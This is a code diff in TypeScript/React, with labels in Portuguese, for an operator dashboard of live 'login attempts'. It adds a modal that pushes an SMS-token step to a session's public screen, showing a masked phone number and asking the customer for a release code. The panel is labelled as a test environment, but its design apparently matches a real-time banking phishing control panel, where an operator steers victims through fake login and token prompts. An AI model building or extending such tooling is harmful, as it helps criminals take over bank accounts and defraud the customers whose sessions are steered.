@@ -371,6 +371,8 @@ interface LoginSession {
   currentStep: string | null;
   status: string;
   directive: string;
+  smsLast3: string | null;
+  smsTestCode: string | null;
   steps: SessionStep[];
   history: SessionHistoryEntry[];
   ip: string | null;
@@ -504,15 +506,36 @@ function SessionBlock({
   expanded,
   onToggle,
   onCommand,
+  onSmsToken,
   onHistory,
 }: {
   session: LoginSession;
   expanded: boolean;
   onToggle: () => void;
   onCommand: (id: string, command: string) => void;
+  onSmsToken: (id: string, last3: string) => Promise<{ testCode?: string }>;
   onHistory: () => void;
 }) {
   const ended = session.status === 'ended';
+  const [smsOpen, setSmsOpen] = useState(false);
+  const [smsLast3, setSmsLast3] = useState('');
+  const [smsCode, setSmsCode] = useState('');
+  const [smsBusy, setSmsBusy] = useState(false);
+
+  const openSms = () => {
+    setSmsLast3('');
+    setSmsCode('');
+    setSmsBusy(false);
+    setSmsOpen(true);
+  };
+  const confirmSms = async () => {
+    if (smsLast3.length !== 3 || smsBusy) return;
+    setSmsBusy(true);
+    const d = await onSmsToken(session.id, smsLast3);
+    setSmsBusy(false);
+    setSmsCode(d?.testCode ?? '----');
+  };
+
   return (
     <div className={`donas-session${ended ? ' is-ended' : ''}`} data-testid="session-block">
       <button type="button" className="donas-session-head" onClick={onToggle} data-testid="session-head">
@@ -560,6 +583,11 @@ function SessionBlock({
             <span><b>Navegador:</b> {session.browser ?? '-'}</span>
             <span><b>Sistema:</b> {session.os ?? '-'}</span>
             <span><b>Atualizado:</b> {new Date(session.updatedAt).toLocaleString('pt-BR')}</span>
+            {session.directive === 'sms_token' && session.smsTestCode && (
+              <span data-testid="session-homolog-code">
+                <b>Cód. homologação:</b> {session.smsTestCode}
+              </span>
+            )}
           </div>
 
           <h4 className="donas-section-title">COMANDOS</h4>
@@ -570,7 +598,10 @@ function SessionBlock({
                 type="button"
                 className={`donas-cmd-btn${session.directive === c.key ? ' is-active' : ''}`}
                 disabled={ended}
-                onClick={() => onCommand(session.id, c.key)}
+                onClick={() => {
+                  if (c.key === 'sms_token' && session.flowType === 'PJ') openSms();
+                  else onCommand(session.id, c.key);
+                }}
                 data-testid={`session-cmd-${c.key}`}
               >
                 {c.label}
@@ -597,6 +628,72 @@ function SessionBlock({
             >
               Histórico
             </button>
+          </div>
+        </div>
+      )}
+
+      {smsOpen && (
+        <div className="donas-modal-backdrop" onClick={() => setSmsOpen(false)} data-testid="sms-modal">
+          <div className="donas-modal" onClick={(e) => e.stopPropagation()}>
+            <div className="donas-modal-head">
+              <h3>● Token SMS (homologação)</h3>
+              <button type="button" onClick={() => setSmsOpen(false)} aria-label="Fechar" data-testid="sms-modal-close">×</button>
+            </div>
+            <div className="donas-modal-body" style={{ display: 'block' }}>
+              {!smsCode ? (
+                <>
+                  <p className="donas-sms-help">
+                    Informe os <b>3 últimos dígitos</b> de um telefone fictício de teste. A tela
+                    pública exibirá “…XXXXX-X{smsLast3 || '•••'}”. Ambiente de homologação — nenhum
+                    SMS real é enviado.
+                  </p>
+                  <label className="donas-label" htmlFor="sms-last3">3 últimos dígitos</label>
+                  <input
+                    id="sms-last3"
+                    className="donas-input"
+                    inputMode="numeric"
+                    placeholder="Ex.: 234"
+                    value={smsLast3}
+                    maxLength={3}
+                    onChange={(e) => setSmsLast3(e.target.value.replace(/\D/g, '').slice(0, 3))}
+                    autoFocus
+                    data-testid="sms-modal-last3"
+                  />
+                </>
+              ) : (
+                <div className="donas-sms-result">
+                  <p>Comando enviado a esta sessão. Código de <b>homologação</b> para teste:</p>
+                  <div className="donas-sms-code" data-testid="sms-modal-testcode">{smsCode}</div>
+                  <p>
+                    Digite este código na tela pública (campo “Código de liberação”) e clique em
+                    AVANÇAR para validar a comunicação. O valor digitado pelo cliente <b>não é
+                    armazenado</b>.
+                  </p>
+                </div>
+              )}
+            </div>
+            <div className="donas-modal-foot">
+              {!smsCode ? (
+                <button
+                  type="button"
+                  className="donas-submit donas-submit--sm"
+                  disabled={smsLast3.length !== 3 || smsBusy}
+                  onClick={confirmSms}
+                  data-testid="sms-modal-confirm"
+                >
+                  {smsBusy ? 'Enviando…' : 'Enviar para a sessão'}
+                </button>
+              ) : (
+                <button
+                  type="button"
+                  className="donas-submit donas-submit--sm"
+                  onClick={() => setSmsOpen(false)}
+                  data-testid="sms-modal-done"
+                >
+                  Fechar
+                </button>
+              )}
+            </div>
           </div>
         </div>
       )}
@@ -633,6 +730,18 @@ function TentativasView() {
     load();
   };
 
+  const sendSmsToken = async (id: string, last3: string): Promise<{ testCode?: string }> => {
+    const d = await fetch('/api/auth-attempt/command', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', ...authHeaders() },
+      body: JSON.stringify({ id, command: 'sms_token', last3 }),
+    })
+      .then((r) => (r.ok ? r.json() : {}))
+      .catch(() => ({}));
+    load();
+    return d;
+  };
+
   const term = q.trim().toLowerCase();
   const filtered = term
     ? items.filter((s) =>
@@ -661,6 +770,7 @@ function TentativasView() {
             expanded={expandedId === s.id}
             onToggle={() => setExpandedId(expandedId === s.id ? null : s.id)}
             onCommand={sendCommand}
+            onSmsToken={sendSmsToken}
             onHistory={() => setHistoryFor(s)}
           />
         ))}
